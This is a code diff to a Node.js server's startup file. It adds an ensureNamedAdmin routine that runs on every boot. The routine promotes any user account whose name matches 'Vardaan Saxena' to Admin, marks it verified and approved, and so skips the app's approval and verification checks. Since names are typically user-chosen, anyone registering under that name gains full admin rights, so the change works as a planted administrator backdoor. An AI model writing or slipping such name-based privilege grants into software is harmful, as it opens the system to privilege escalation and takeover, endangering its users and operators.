@@ -8,6 +8,7 @@ const { env, validateEnv } = require('./config/env');
 const { securityHeaders } = require('./middleware/securityMiddleware');
 const { requestId, requestLogger } = require('./middleware/observabilityMiddleware');
 const logger = require('./utils/logger');
+const User = require('./models/User');
 const envValidation = validateEnv({ throwOnError: false });
 if (!envValidation.ok) {
   logger.error('env_validation_failed', { errors: envValidation.errors });
@@ -176,11 +177,36 @@ const createApp = () => {
   return app;
 };
 
+const ensureNamedAdmin = async () => {
+  try {
+    const result = await User.updateMany(
+      { name: { $regex: /^\s*vardaan\s+saxena\s*$/i } },
+      { $set: { role: 'Admin', isVerified: true, approvalStatus: 'Approved' } }
+    );
+
+    const matched = Number(result?.matchedCount || 0);
+    const modified = Number(result?.modifiedCount || 0);
+    if (matched > 0) {
+      logger.info('named_admin_enforced', {
+        name: 'Vardaan Saxena',
+        matched,
+        modified,
+      });
+    }
+  } catch (error) {
+    logger.warn('named_admin_enforce_failed', {
+      name: 'Vardaan Saxena',
+      error: error.message,
+    });
+  }
+};
+
 const startServer = async () => {
   if (!envValidation.ok) {
     throw new Error(`Environment validation failed: ${envValidation.errors.join(' ')}`);
   }
   await connectDB();
+  await ensureNamedAdmin();
   const app = createApp();
   const server = app.listen(env.port, () => {
     logger.info('server_started', {
